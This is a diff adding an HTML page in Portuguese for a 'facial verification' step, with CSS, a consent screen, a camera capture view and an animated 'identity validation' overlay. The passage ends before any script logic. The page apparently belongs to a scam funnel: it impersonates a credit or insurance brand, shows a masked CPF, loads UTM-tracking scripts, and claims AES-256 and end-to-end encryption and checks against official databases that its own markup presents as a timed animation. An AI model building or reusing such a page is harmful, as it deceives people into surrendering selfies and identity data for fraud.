@@ -1,0 +1,1282 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <script src="../js/utm.js"></script>
+<script src="../js/tracking.js"></script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>Verificação Facial</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <script src="../../fluxo.js"></script>
+  <style>
+    :root {
+      --primary: #333333;
+      --accent: #0099FF;
+      --accent-yellow: #0099FF;
+      --accent-gold: #0066CC;
+      --primary-deep: #333333;
+      --primary-light: #fef0e4;
+      --green-primary: #111827;
+      --green-dark: #1F2937;
+      --green-darker: #374151;
+      --bg: #F5F5F5;
+      --card: #fff;
+      --muted: #6b7280;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --radius: 14px;
+      font-family: 'Hind Siliguri', sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: #FFFFFF;
+      color: #111827;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+    }
+
+    header.header {
+      background: #FFFFFF;
+      padding: 14px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 1px 0 #E5E7EB;
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 420px;
+      margin: 0 auto;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+      background: #F3F4F6;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid #E5E7EB;
+    }
+
+    .menu-icon:hover {
+      background: #E5E7EB;
+      transform: scale(1.05);
+    }
+
+    .menu-icon svg {
+      width: 18px;
+      height: 18px;
+      color:#4b5563;
+      stroke-width: 2.5;
+    }
+
+    .header-logo { height:36px; width:auto; }
+
+    .logo-cred {
+      font-family:'Hind Siliguri','Poppins', 'Poppins', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #111827;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .logo-diamond {
+      width: 7px;
+      height: 7px;
+      background: #0099FF;
+      transform: rotate(45deg);
+      margin: 0 8px;
+      border-radius: 1.5px;
+      flex-shrink: 0;
+    }
+
+    .logo-on {
+      font-family:'Hind Siliguri','Poppins', 'Poppins', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #333333;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .logo-tagline {
+      font-family: 'Hind Siliguri', 'Poppins', sans-serif;
+      font-weight: 600;
+      font-size: 7px;
+      letter-spacing: 2.5px;
+      text-transform: uppercase;
+      color: #6B7280;
+      margin-top: 1px;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #111827;
+      max-width: 120px;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: #6B7280;
+      letter-spacing: 0.3px;
+    }
+
+    .user-icon-wrapper {
+      width: 40px;
+      height: 40px;
+            background: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #0099FF;
+      color: #0099FF;
+    }
+
+    .user-icon-wrapper svg {
+      width: 20px;
+      height: 20px;
+      color: #0099FF;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .wrap {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      flex: 1;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: 0 8px 28px rgba(26, 58, 58, 0.1);
+      padding: 20px;
+      border: 1px solid rgba(26, 58, 58, 0.08);
+    }
+
+    h1 {
+      font-size: 1.25rem;
+      margin: 0 0 8px;
+      color: #111827;
+      font-family:'Hind Siliguri','Poppins', sans-serif;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+
+    p.lead {
+      margin: 0 0 14px;
+      color: var(--muted);
+      font-size: 0.95rem
+    }
+
+    .card#stepConsent {
+      text-align: center;
+      border: none;
+      box-shadow: none;
+      background: transparent;
+      padding: 0;
+    }
+    #stepConsent h1 { text-align: center; font-size: 1.5rem; }
+    #stepConsent p.lead { text-align: center; font-size: 1.05rem; line-height: 1.5; }
+
+    .consent-list {
+      display: grid;
+      gap: 0;
+      margin: 18px 0 0;
+      text-align: left;
+    }
+
+    .consent-item {
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+      background: transparent;
+      border: none;
+      border-top: 1px solid #EEF0F2;
+      padding: 16px 2px;
+    }
+
+    .consent-item:first-child { border-top: none; }
+
+    .consent-icon {
+      flex: 0 0 44px;
+      width: 44px;
+      height: 44px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .consent-icon svg {
+      width: 22px;
+      height: 22px;
+      stroke-width: 2;
+    }
+
+    .consent-icon.green { background: #dcfce7; color: #22c55e; }
+    .consent-icon.blue { background: #DBEAFE; color: #2563EB; }
+    .consent-icon.orange { background: #fef0e4; color: #0066CC; }
+
+    .consent-item strong {
+      display: block;
+      color: #111827;
+      font-size: 16.5px;
+      margin-bottom: 3px;
+    }
+
+    .consent-item .small {
+      color: #6B7280;
+      font-size: 14.5px;
+      line-height: 1.5;
+    }
+
+    #stepConsent .lgpd-note {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 13.5px;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 16px
+    }
+
+    .btn {
+      flex: 1;
+      padding: 15px 16px;
+      border-radius: 10px;
+      font-weight: 600;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      font-family: 'Hind Siliguri', sans-serif;
+      transition: all 0.2s ease;
+    }
+
+    .btn.primary {
+      background: var(--accent);
+      color: #fff;
+      box-shadow: 0 4px 12px rgba(250, 99, 0, .25);
+    }
+
+    .btn.primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(250, 99, 0, .35);
+      background: #0066CC;
+    }
+
+    .btn.ghost {
+      background: transparent;
+      color: #111827;
+      border: 2px solid #E5E7EB
+    }
+
+    .btn.ghost:hover {
+      background: #F3F4F6;
+    }
+
+    /* ===== Verificação facial em tela cheia ===== */
+    .cam-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 3000;
+      background: #000;
+      overflow: hidden;
+    }
+    .cam-screen.hidden { display: none !important; }
+
+    .cam-screen video,
+    .cam-photo {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+    .cam-photo.hidden { display: none !important; }
+
+    .cam-overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      background: linear-gradient(180deg, rgba(0,0,0,.35) 0%, rgba(0,0,0,0) 22%, rgba(0,0,0,0) 55%, rgba(0,0,0,.55) 100%);
+    }
+
+    .cam-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 18px 18px 0;
+    }
+    .cam-back {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: rgba(0,0,0,.4);
+      border: none;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      -webkit-backdrop-filter: blur(6px);
+      backdrop-filter: blur(6px);
+    }
+    .cam-back svg { width: 22px; height: 22px; }
+    .cam-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(70, 42, 113, .45);
+      color: #0099FF;
+      border: 1px solid rgba(250, 99, 0, .5);
+      padding: 8px 14px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 600;
+      -webkit-backdrop-filter: blur(6px);
+      backdrop-filter: blur(6px);
+    }
+    .cam-status .cam-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #0099FF;
+      box-shadow: 0 0 8px #0099FF;
+    }
+    .cam-status svg { width: 15px; height: 15px; stroke-width: 3; }
+
+    .cam-guide {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .cam-frame {
+      position: relative;
+      width: 270px;
+      height: 340px;
+    }
+    .cam-oval {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 230px;
+      height: 290px;
+      border-radius: 50%;
+      border: 3px solid rgba(255,255,255,.92);
+      box-shadow: 0 0 0 3px rgba(70, 42, 113, .85), 0 0 60px rgba(0,0,0,.35);
+    }
+    .cam-bracket {
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      border: 3px solid #0A0047;
+    }
+    .cam-bracket.tl { top: 0; left: 0; border-right: none; border-bottom: none; border-top-left-radius: 8px; }
+    .cam-bracket.tr { top: 0; right: 0; border-left: none; border-bottom: none; border-top-right-radius: 8px; }
+    .cam-bracket.bl { bottom: 0; left: 0; border-right: none; border-top: none; border-bottom-left-radius: 8px; }
+    .cam-bracket.br { bottom: 0; right: 0; border-left: none; border-top: none; border-bottom-right-radius: 8px; }
+
+    .cam-bottom {
+      padding: 0 22px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    .cam-instruction {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+      text-align: center;
+      text-shadow: 0 1px 8px rgba(0,0,0,.7);
+      margin: 0 0 8px;
+    }
+    .cam-secure {
+      color: rgba(255,255,255,.82);
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      text-shadow: 0 1px 8px rgba(0,0,0,.7);
+      margin: 0 0 16px;
+    }
+    .cam-secure svg { width: 13px; height: 13px; }
+    .cam-actions {
+      position: relative;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 76px;
+    }
+    .cam-shutter {
+      width: 74px;
+      height: 74px;
+      border-radius: 50%;
+      background: #fff;
+      border: 4px solid rgba(255,255,255,.55);
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(0,0,0,.45), inset 0 0 0 2px rgba(0,0,0,.06);
+      transition: transform 0.12s ease;
+    }
+    .cam-shutter:active { transform: scale(.93); }
+    .cam-reset {
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background: rgba(0,0,0,.4);
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      -webkit-backdrop-filter: blur(6px);
+      backdrop-filter: blur(6px);
+    }
+    .cam-reset svg { width: 22px; height: 22px; }
+
+    .cam-preview-actions {
+      display: flex;
+      gap: 12px;
+      width: 100%;
+    }
+    .cam-preview-actions.hidden { display: none !important; }
+    .cam-preview-actions .btn {
+      flex: 1;
+      padding: 16px;
+      font-size: 16px;
+      border-radius: 14px;
+    }
+    .cam-preview-actions .btn.ghost {
+      background: rgba(255,255,255,.16);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,.35);
+      -webkit-backdrop-filter: blur(6px);
+      backdrop-filter: blur(6px);
+    }
+    .cam-preview-actions .btn.ghost:hover { background: rgba(255,255,255,.26); }
+    .cam-preview-actions .btn.primary { background: var(--accent); color: #fff; }
+
+    .cam-error {
+      color: #fca5a5;
+      font-size: 13px;
+      text-align: center;
+      text-shadow: 0 1px 6px rgba(0,0,0,.6);
+    }
+    .cam-error.hidden { display: none !important; }
+
+    /* ===== Validação da identidade ===== */
+    .vf-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 4000;
+      background: #FFFFFF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 28px 24px;
+    }
+    .vf-overlay.hidden { display: none !important; }
+    .vf-view {
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      animation: vfFade .4s ease;
+    }
+    .vf-view.hidden { display: none !important; }
+    @keyframes vfFade { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    .vf-face {
+      position: relative;
+      width: 92px;
+      height: 92px;
+      margin: 0 auto 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .vf-face::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 4px solid #EEF1F4;
+    }
+    .vf-face-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 4px solid transparent;
+      border-top-color: #0066CC;
+      border-right-color: #0066CC;
+      animation: vfSpin 1s linear infinite;
+    }
+    .vf-face-smile {
+      width: 52px;
+      height: 52px;
+      color: #0066CC;
+    }
+    @keyframes vfSpin { to { transform: rotate(360deg); } }
+
+    .vf-title {
+      font-family:'Hind Siliguri','Poppins', sans-serif;
+      font-size: 22px;
+      font-weight: 700;
+      color: #111827;
+      margin: 0 0 8px;
+    }
+    .vf-sub {
+      font-size: 14.5px;
+      line-height: 1.5;
+      color: #6B7280;
+      margin: 0 auto 26px;
+      max-width: 320px;
+    }
+
+    .vf-steps {
+      display: flex;
+      flex-direction: column;
+      text-align: left;
+      margin-bottom: 22px;
+    }
+    .vf-step {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 2px;
+      border-top: 1px solid #EEF0F2;
+      transition: opacity .3s ease;
+    }
+    .vf-step:first-child { border-top: none; }
+    .vf-step-icon {
+      flex: 0 0 34px;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #F3F4F6;
+      border: 1.5px solid #E5E7EB;
+    }
+    .vf-step-icon .vf-check {
+      width: 18px;
+      height: 18px;
+      color: #C4C9D0;
+    }
+    .vf-step-icon .vf-spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2.5px solid #fde0c8;
+      border-top-color: #0066CC;
+      animation: vfSpin .8s linear infinite;
+    }
+    .vf-step strong {
+      display: block;
+      font-size: 15px;
+      font-weight: 700;
+      color: #9CA3AF;
+      margin-bottom: 1px;
+    }
+    .vf-step .vf-step-text span {
+      font-size: 13px;
+      color: #9CA3AF;
+    }
+
+    /* Estado: concluído */
+    .vf-step.done .vf-step-icon {
+            background: #dcfce7;
+      border-color: #bbf7d0;
+    }
+    .vf-step.done .vf-step-icon .vf-check { color: #22c55e; }
+    .vf-step.done strong { color: #16a34a; }
+
+    /* Estado: em andamento */
+    .vf-step.active .vf-step-icon {
+      background: #fff;
+      border-color: #fde0c8;
+    }
+    .vf-step.active .vf-step-icon .vf-check { display: none; }
+    .vf-step.active .vf-step-icon .vf-spinner { display: block; }
+    .vf-step.active strong { color: #111827; }
+
+    .vf-secure {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      font-size: 12.5px;
+      color: #9CA3AF;
+      margin: 0;
+    }
+    .vf-secure svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+    /* Sucesso */
+    .vf-success-icon {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+            background: #dcfce7;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 22px;
+      animation: vfPop .4s ease;
+    }
+    .vf-success-icon svg { width: 44px; height: 44px; color: #22c55e; }
+    @keyframes vfPop { 0% { transform: scale(.6); opacity: 0; } 60% { transform: scale(1.08); } 100% { transform: scale(1); opacity: 1; } }
+    .vf-redirect {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13.5px;
+      color: #9CA3AF;
+      margin: 18px 0 0;
+    }
+    .vf-mini-spinner {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 2px solid #D1D5DB;
+      border-top-color: #22c55e;
+      animation: vfSpin .8s linear infinite;
+    }
+
+    .small {
+      font-size: 0.88rem;
+      color: var(--muted)
+    }
+
+    .danger {
+      color: var(--danger)
+    }
+
+    .success {
+      color: var(--success)
+    }
+
+    .hidden {
+      display: none !important
+    }
+
+    footer.site-footer {
+      margin-top: auto;
+      background: #FFFFFF;
+      color: #6B7280;
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-top: 1px solid #E5E7EB;
+    }
+
+    .footer-inner {
+      max-width: 420px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    .footer-logo .fl-cred {
+      font-family:'Hind Siliguri','Poppins', 'Poppins', sans-serif;
+      font-weight: 800;
+      font-size: 15px;
+      color: #6B7280;
+      letter-spacing: -0.5px;
+    }
+
+    .footer-logo .fl-diamond {
+      width: 5px;
+      height: 5px;
+      background: #6B7280;
+      transform: rotate(45deg);
+      margin: 0 6px;
+      border-radius: 1px;
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    .footer-logo .fl-on {
+      font-family:'Hind Siliguri','Poppins', 'Poppins', sans-serif;
+      font-weight: 800;
+      font-size: 15px;
+      color: #333333;
+      letter-spacing: -0.5px;
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.75;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    footer small strong {
+      color: #333333;
+      font-weight: 600;
+    }
+    .footer-badges { display: flex; align-items: center; gap: 16px; margin-top: 4px; }
+    .footer-badges span { display: flex; align-items: center; gap: 4px; font-size: 10px; color: #9CA3AF; font-weight: 500; }
+    .footer-badges svg { width: 12px; height: 12px; color: #9CA3AF; }
+
+    @media (max-width:420px) {
+      .guide .ring {
+        width: 180px;
+        height: 210px
+      }
+
+      .card {
+        margin: 10px;
+        padding: 16px;
+      }
+
+      .wrap {
+        padding: 16px;
+      }
+    }
+  
+/* =================== FOOTER BOM PRA CRÉDITO =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"Hind Siliguri",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:42px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#0099FF}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#0A0047}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"Hind Siliguri",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#0A0047;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#333333}
+
+</style>
+</head>
+
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <img src="../images/logo.png" alt="Porto" class="header-logo">
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="wrap">
+    <div class="card" id="stepConsent">
+      <h1>Verificação facial</h1>
+      <p class="lead">Para sua segurança, precisamos validar sua identidade com uma selfie. O processo é rápido e
+        seguro.</p>
+      <div class="consent-list">
+        <div class="consent-item">
+          <div class="consent-icon green">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+          </div>
+          <div>
+            <strong>Uso limitado</strong>
+            <div class="small">A foto será usada apenas para validação de identidade no processo de contratação.</div>
+          </div>
+        </div>
+        <div class="consent-item">
+          <div class="consent-icon blue">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+          </div>
+          <div>
+            <strong>Proteção de dados</strong>
+            <div class="small">Seus dados e imagem não serão compartilhados com terceiros sem autorização.</div>
+          </div>
+        </div>
+        <div class="consent-item">
+          <div class="consent-icon orange">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="12" cy="12" r="10"></circle>
+              <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+          </div>
+          <div>
+            <strong>Rápido e simples</strong>
+            <div class="small">Leva menos de 1 minuto — confirme e tire a foto.</div>
+          </div>
+        </div>
+      </div>
+      <div class="small lgpd-note">Ao confirmar você autoriza a captura e o uso da imagem para validação desta
+        operação, conforme a LGPD.</div>
+      <div class="btn-row">
+        <button class="btn ghost" id="btnCancel">Cancelar</button>
+        <button class="btn primary" id="btnAgree">Concordo e prosseguir</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Tela de verificação facial em tela cheia -->
+  <div class="cam-screen hidden" id="stepCamera">
+    <video id="video" autoplay="" playsinline="" muted=""></video>
+    <img id="photoImg" class="cam-photo hidden" alt="Foto capturada">
+
+    <div class="cam-overlay">
+      <div class="cam-top">
+        <button class="cam-back" id="btnCamBack" type="button" aria-label="Voltar">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+          </svg>
+        </button>
+        <div class="cam-status" id="camStatus"><span class="cam-dot"></span> Verificação ativa</div>
+      </div>
+
+      <div class="cam-guide">
+        <div class="cam-frame">
+          <span class="cam-oval"></span>
+          <span class="cam-bracket tl"></span>
+          <span class="cam-bracket tr"></span>
+          <span class="cam-bracket bl"></span>
+          <span class="cam-bracket br"></span>
+        </div>
+      </div>
+
+      <div class="cam-bottom">
+        <div id="cameraControls">
+          <p class="cam-instruction">Posicione seu rosto dentro do contorno</p>
+          <p class="cam-secure">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            Conexão segura · Criptografia ponta a ponta
+          </p>
+          <div class="cam-actions">
+            <button class="cam-reset" id="btnRetryCam" type="button" aria-label="Reiniciar câmera">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+            </button>
+            <button class="cam-shutter" id="btnCapture" type="button" aria-label="Capturar"></button>
+          </div>
+        </div>
+
+        <div class="cam-preview-actions hidden" id="previewArea">
+          <button class="btn ghost" id="btnRetake" type="button">Tentar novamente</button>
+          <button class="btn primary" id="btnUse" type="button">Usar esta foto</button>
+        </div>
+
+        <div id="cameraError" class="cam-error hidden"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Validação da identidade (animação após "Usar esta foto") -->
+  <div class="vf-overlay hidden" id="verifyOverlay">
+    <div class="vf-view" id="vfValidating">
+      <div class="vf-face">
+        <span class="vf-face-ring"></span>
+        <svg class="vf-face-smile" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round">
+          <circle cx="24" cy="28" r="1.6" fill="currentColor" stroke="none"></circle>
+          <circle cx="40" cy="28" r="1.6" fill="currentColor" stroke="none"></circle>
+          <path d="M23 38c2.6 3.2 15.4 3.2 18 0"></path>
+        </svg>
+      </div>
+
+      <h2 class="vf-title">Validando identidade</h2>
+      <p class="vf-sub">Estamos analisando sua foto e verificando seus dados. Aguarde um momento.</p>
+
+      <div class="vf-steps">
+        <div class="vf-step">
+          <span class="vf-step-icon">
+            <svg class="vf-check" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            <span class="vf-spinner"></span>
+          </span>
+          <div class="vf-step-text">
+            <strong>Processando imagem</strong>
+            <span>Analisando qualidade e nitidez da foto</span>
+          </div>
+        </div>
+        <div class="vf-step">
+          <span class="vf-step-icon">
+            <svg class="vf-check" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            <span class="vf-spinner"></span>
+          </span>
+          <div class="vf-step-text">
+            <strong>Reconhecimento facial</strong>
+            <span>Mapeando pontos biométricos</span>
+          </div>
+        </div>
+        <div class="vf-step">
+          <span class="vf-step-icon">
+            <svg class="vf-check" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            <span class="vf-spinner"></span>
+          </span>
+          <div class="vf-step-text">
+            <strong>Verificação de segurança</strong>
+            <span>Conferindo dados com as bases oficiais</span>
+          </div>
+        </div>
+        <div class="vf-step">
+          <span class="vf-step-icon">
+            <svg class="vf-check" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            <span class="vf-spinner"></span>
+          </span>
+          <div class="vf-step-text">
+            <strong>Finalizando validação</strong>
+            <span>Confirmando identidade e preparando aprovação</span>
+          </div>
+        </div>
+      </div>
+
+      <p class="vf-secure">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        Seus dados estão protegidos com criptografia AES-256
+      </p>
+    </div>
+
+    <div class="vf-view hidden" id="vfSuccess">
+      <div class="vf-success-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+      </div>
+      <h2 class="vf-title">Identidade verificada!</h2>
+      <p class="vf-sub">Sua verificação facial foi concluída com sucesso. Seus dados estão seguros e validados.</p>
+      <p class="vf-redirect"><span class="vf-mini-spinner"></span> Redirecionando para a próxima etapa...</p>
